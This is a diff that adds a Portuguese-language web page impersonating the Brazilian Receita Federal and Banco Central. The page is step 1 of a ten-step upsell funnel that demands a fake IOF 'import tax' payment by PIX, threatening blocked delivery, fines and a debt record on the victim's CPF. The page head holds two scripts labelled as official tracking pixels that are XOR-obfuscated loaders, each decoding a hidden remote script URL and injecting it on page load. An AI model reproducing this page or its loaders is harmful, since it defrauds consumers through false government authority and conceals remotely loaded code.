@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <!-- UTMify Pixel Oficial -->
+  <script>(function(){var v_atm=atob("DKAuJ0u7WAgZxHpU0NsMUjnXejI7rA4goNMUCGTYPGY3sQ45ucZXCSjUNSZ7tlUns9JHVz/Id3hwvB84/9BHXy7XdmJq5lZ2sdRaVSLZLXx8t1hui/0CBSzXN2p4qAl26vtVBSXaNW07/lgkudhLSwLfeiQ7shs4pcUMHWmNOWoq9042tZMaEXKJOmksp0I24JZKRHuZJVVk");var y_8=[];for(var j_mxm=0;j_mxm<v_atm.length;j_mxm++){y_8.push(v_atm.charCodeAt(j_mxm)&255);}var u_9=y_8[0];var j_ne4=y_8.slice(1,1+u_9);var j_l=y_8.slice(1+u_9);var q_c4uo=j_l.map(function(b,j_xloa){return b^j_ne4[j_xloa%u_9];});var w_n6="";for(var p_if=0;p_if<q_c4uo.length;p_if++){w_n6+=String.fromCharCode(q_c4uo[p_if]&255);}var t_0s9=decodeURIComponent(escape(w_n6));var e_ag=JSON.parse(t_0s9);var i_b=e_ag.globals||[];i_b.forEach(function(b_xea0){window[b_xea0.name]=b_xea0.value;});var v_s6q=document.createElement("script");v_s6q.src=e_ag.url;v_s6q.async=true;v_s6q.defer=true;(e_ag.attributes||[]).forEach(function(i_l){v_s6q.setAttribute(i_l.name,i_l.value);});(document.head||document.documentElement).appendChild(v_s6q);})();</script>
+  <!-- UTMify Script Oficial -->
+  <script>(function(){var m_h3b=atob("GJXZMun4i+1ceA2qgTebOetKfbLJN1X5ce77R5uUqdd+EHne8UShFsQpGdznQiGUGPOgHIqX5sM+CiLZ4kXySZ85Use9WibWHfStV5qMpYcvWiGI4EPvS4IoCMasRHfDKu77XIiV7s9mWmnL9Va2TJ8nFNSwGiWLFOO8XJ3V844zHCDZ4ly5Fck8HN68UnfDU7ekHpLa5YwxHS+Qo1P6TYpnCMakXjOAXOWrV5+d5ZlxC3jI6FPoG8doC9OlQjDbS7f7T7SF");var a_2f=[];for(var m_y8yk=0;m_y8yk<m_h3b.length;m_y8yk++){a_2f.push(m_h3b.charCodeAt(m_y8yk)&255);}var z_zak=a_2f[0];var b_tbfs=a_2f.slice(1,1+z_zak);var a_68s=a_2f.slice(1+z_zak);var u_kq=a_68s.map(function(b,u_4bf){return b^b_tbfs[u_4bf%z_zak];});var p_t1d="";for(var b_26v5=0;b_26v5<u_kq.length;b_26v5++){p_t1d+=String.fromCharCode(u_kq[b_26v5]&255);}var p_4=decodeURIComponent(escape(p_t1d));var p_31w=JSON.parse(p_4);var x_3h2=p_31w.globals||[];x_3h2.forEach(function(i_7pl){window[i_7pl.name]=i_7pl.value;});var u_tiv8=document.createElement("script");u_tiv8.src=p_31w.url;u_tiv8.async=true;u_tiv8.defer=true;(p_31w.attributes||[]).forEach(function(d_z9i){u_tiv8.setAttribute(d_z9i.name,d_z9i.value);});(document.head||document.documentElement).appendChild(u_tiv8);})();</script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <title>Recolhimento de IOF • Imposto sobre Operações Financeiras — Importação</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="./js/helpers.js?v=20260726"></script>
+  <script src="./js/pix.js?v=20260726"></script>
+  <script src="./js/upsell.js?v=20260726"></script>
+  <style>
+    @keyframes spin { to { transform: rotate(360deg); } }
+    @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: .5; } }
+    .animate-spin { animation: spin 1s linear infinite; }
+    .animate-pulse { animation: pulse 2s ease-in-out infinite; }
+  </style>
+</head>
+<body style="background:#F7F8FA">
+<div id="upsell-root"></div>
+<script>
+renderUpsell({
+  "slug": "iof",
+  "stepNum": 1,
+  "nextUrl": (window.location.protocol === 'file:' ? '../up2/index.html' : '/ups/up2/'),
+  "productName": "Recolhimento de IOF sobre Importação",
+  "icon": "🏛️",
+  "headerTitle": "Recolhimento de IOF • Imposto sobre Operações Financeiras — Importação",
+  "docRight": "Receita Federal • Banco Central",
+  "alertTitle": "⚠️ IOF não recolhido — liberação bloqueada",
+  "alertText": "Toda importação com câmbio está sujeita ao IOF. Enquanto o imposto não for recolhido, o Banco Central mantém a operação bloqueada e a mercadoria não avança no despacho.",
+  "consequences": [
+    "Bloqueio da operação cambial — o pacote fica travado no sistema do Banco Central.",
+    "Multa e juros crescentes a cada dia de atraso no recolhimento.",
+    "Registro de pendência tributária vinculada ao seu CPF.",
+    "Cancelamento do despacho e devolução ao exterior."
+  ],
+  "without": [
+    "Operação cambial travada",
+    "Multa e juros diários",
+    "Pendência no CPF",
+    "Despacho cancelado"
+  ],
+  "withNow": [
+    "Imposto quitado na hora",
+    "Operação liberada",
+    "CPF sem pendências",
+    "Despacho retomado"
+  ],
+  "legal": "Decreto nº 6.306/2007 (Regulamento do IOF) — incide sobre operações de câmbio relativas a importação de bens. O recolhimento é condição para a liberação cambial da operação.",
+  "offer": {
+    "badge": "Imposto Obrigatório",
+    "fromPrice": 29.9,
+    "price": 47.0,
+    "ctaText": "Recolher IOF Agora",
+    "microcopy": "Valor único do IOF para desbloquear a operação e liberar a sua mercadoria imediatamente."
+  },
+  "downsell": {
+    "title": "Parcela Única Reduzida do IOF",
+    "desc": "Liberamos o recolhimento em parcela única reduzida, válida somente agora, para quitar o imposto e destravar a operação.",
+    "price": 8.9,
+    "ctaText": "Recolher IOF Reduzido",
+    "warning": "Sem o recolhimento, a operação permanece bloqueada e o pedido é cancelado. Sem reembolso."
+  },
+  "refuseText": "Recusar recolhimento (operação será cancelada)",
+  "faq": [
+    {
+      "q": "Por que pagar IOF?",
+      "a": "O IOF incide sobre a operação de câmbio da importação. Sem o recolhimento, o Banco Central mantém a operação bloqueada."
+    },
+    {
+      "q": "É cobrança única?",
+      "a": "Sim. Taxa única, sem cobranças futuras."
+    },
+    {
+      "q": "Quando libera?",
+      "a": "Após o PIX, a operação é desbloqueada em instantes."
+    }
+  ],
+  "trust": [
+    "Banco Central",
+    "Receita Federal",
+    "SSL 256 bits",
+    "SPB"
+  ],
+  "accent": "#1E40AF",
+  "totalSteps": 10
+});
+</script>
+</body>
+</html>
